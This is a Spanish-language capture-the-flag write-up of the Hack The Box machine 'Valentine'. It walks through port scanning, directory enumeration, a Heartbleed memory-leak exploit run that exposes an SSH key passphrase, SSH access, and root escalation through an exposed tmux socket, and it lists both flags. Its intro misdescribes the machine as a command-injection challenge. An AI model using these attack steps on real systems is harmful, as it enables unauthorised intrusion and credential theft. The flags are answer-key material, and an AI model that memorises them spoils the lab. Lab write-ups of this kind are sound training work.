- --
- Tags: #ejptmachine #heartbleed #id_rsa #curl 
--- --
### ¿Qué habilidades puedes practicar con Valentine?

1. **Reconocimiento y escaneo de puertos:**
    - Al igual que en muchas de las máquinas de Hack The Box, el primer paso será realizar un **escaneo de puertos** con herramientas como **Nmap** para identificar los servicios expuestos y los puertos abiertos. Este es un paso crucial para empezar a planificar la explotación.
2. **Explotación de vulnerabilidades web:**
    - **Valentine** te ofrece un desafío que involucra una vulnerabilidad web, y es una buena oportunidad para practicar la **inyección de comandos** en un **formulario web vulnerable**. La máquina se basa en la explotación de **inyección en parámetros de la URL**, lo que es útil para mejorar tus habilidades en la explotación de **vulnerabilidades web comunes**.
    - La explotación de vulnerabilidades como **XSS** o **LFI** (Local File Inclusion) también puede ser parte del reto, dependiendo de cómo encuentres la máquina configurada
3. **Escalada de privilegios en Linux:**
    - Después de obtener acceso inicial a la máquina, tendrás que buscar formas de **escalar privilegios en el sistema Linux**. Esto puede involucrar **errores de configuración**, permisos de archivos incorrectos o vulnerabilidades en servicios ejecutándose con privilegios elevados.
    - Herramientas como **LinPEAS** o manualmente buscar archivos con permisos erróneos pueden ayudarte a encontrar caminos hacia la escalada.

---

https://www.youtube.com/watch?v=7rWYJmXMVHw&ab_channel=maddsec

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.79 -oN portScan`

![Pasted image 20241214123056](../../Fotos/Pasted%20image%2020241214123056.png)

`nmap --script vuln 10.10.10.79`

![Pasted image 20241214183549](../../Fotos/Pasted%20image%2020241214183549.png)

![Pasted image 20241214183604](../../Fotos/Pasted%20image%2020241214183604.png)

![Pasted image 20241214123424](../../Fotos/Pasted%20image%2020241214123424.png)

- La imagen hace referencia a una vulnerabilidad llamada heart bleed

`gobuster dir -u valentine.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

![Pasted image 20241214130507](../../Fotos/Pasted%20image%2020241214130507.png)

`gobuster dir -u http://valentine.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt`

![Pasted image 20241214130559](../../Fotos/Pasted%20image%2020241214130559.png)

![Pasted image 20241214130738](../../Fotos/Pasted%20image%2020241214130738.png)

![Pasted image 20241214130729](../../Fotos/Pasted%20image%2020241214130729.png)

![Pasted image 20241214130815](../../Fotos/Pasted%20image%2020241214130815.png)

![Pasted image 20241214130806](../../Fotos/Pasted%20image%2020241214130806.png)

![Pasted image 20241214132228](../../Fotos/Pasted%20image%2020241214132228.png)

![Pasted image 20241214132353](../../Fotos/Pasted%20image%2020241214132353.png)

`curl -s http://valentine.htb/dev/hype_key | xxd -ps -r`

![Pasted image 20241214142703](../../Fotos/Pasted%20image%2020241214142703.png)

![Pasted image 20241214132614](../../Fotos/Pasted%20image%2020241214132614.png)

El script se ejecuta y toma memoria del servidor de destino (es útil eliminar líneas de 0):
`python2 exploit.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"`

![Pasted image 20241214133214](../../Fotos/Pasted%20image%2020241214133214.png)

Copiamos

![Pasted image 20241214150109](../../Fotos/Pasted%20image%2020241214150109.png)

![Pasted image 20241214150123](../../Fotos/Pasted%20image%2020241214150123.png)

`echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d`

![Pasted image 20241214150137](../../Fotos/Pasted%20image%2020241214150137.png)

- heartbleedbelievethehype : Termina siendo la palabra clave para acceder a la conexión ssh


`curl -s http://valentine.htb/dev/hype_key | xxd -ps -r > id_rsa`

![Pasted image 20241214150614](../../Fotos/Pasted%20image%2020241214150614.png)

`-o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa`

![Pasted image 20241214151213](../../Fotos/Pasted%20image%2020241214151213.png)

*El servidor al que estás accediendo utiliza un sistema operativo antiguo (Ubuntu 12.04 LTS)*

![Pasted image 20241227125431](../../Fotos/Pasted%20image%2020241227125431.png)

`Maquina Vulnerada`

![Pasted image 20241214151336](../../Fotos/Pasted%20image%2020241214151336.png)

User Flag: 33f39bc6e1746b98f0acd81e3fab6902

---
### Forma 2 
- Se logear con la id_rsa pero sinq ue pida la clave osea que desencriptamos la ida rsa y luego simplemente generamos la conexión de esta forma

![Pasted image 20241227130643](../../Fotos/Pasted%20image%2020241227130643.png)

---

*Escalada de privilegios*

![Pasted image 20241214152439](../../Fotos/Pasted%20image%2020241214152439.png)

![Pasted image 20241214152620](../../Fotos/Pasted%20image%2020241214152620.png)

Es necesario aplicar un tratamiento de la terminal sencillo
`export_TERM=xterm`
Mandamos el comando
`tmux -S /.devs/dev_sess`
- Nos da la escalada de privilegios por un problema de configuración claramente

![Pasted image 20241214153501](../../Fotos/Pasted%20image%2020241214153501.png)

![Pasted image 20241214153543](../../Fotos/Pasted%20image%2020241214153543.png)

Root Flag: f6c97eda34e8ec43b444f081292161ba

---


hay otra escalada que es el dirtycow revisar